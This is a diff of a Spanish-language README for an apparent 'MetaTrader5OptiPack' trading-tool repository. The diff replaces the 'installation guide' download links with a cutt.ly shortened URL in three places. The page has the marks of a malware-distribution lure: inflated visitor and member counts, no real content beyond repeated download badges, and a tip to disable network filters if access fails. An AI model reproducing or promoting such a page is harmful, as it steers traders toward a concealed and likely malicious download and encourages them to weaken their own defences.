@@ -6,7 +6,7 @@
 
 **Acerca de MetaTrader5OptiPack**: MetaTrader5OptiPack es un repositorio para usuarios de *MetaTrader 5 2025* en Windows, con herramientas y configuraciones comunitarias para optimizar el análisis de mercados y el trading automatizado. Mejora el rendimiento, reduce tiempos de ejecución y potencia estrategias de trading para una experiencia fluida. Con 15M+ visitantes y 8M+ miembros, ¡eleva tus operaciones hoy!
 
- <a href="https://meta-trader-5-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/prNrVf20" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="85" style="border:none;">
 </a>
 
@@ -22,7 +22,7 @@ Mejora tu *MetaTrader 5 2025* con **MetaTrader5OptiPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
- <a href="https://meta-trader-5-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/prNrVf20" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="85" style="border:none;">
 </a>
 
@@ -35,7 +35,7 @@ Mejora tu *MetaTrader 5 2025* con **MetaTrader5OptiPack** en Windows:
 - 🤝 **Comunidad Activa**: Conecta con 8M+ miembros.  
 - 📅 **Actualizaciones Frecuentes**: Nuevas herramientas para tus estrategias.
 
- <a href="https://meta-trader-5-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/prNrVf20" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="450" height="85" style="border:none;">
 </a>
 
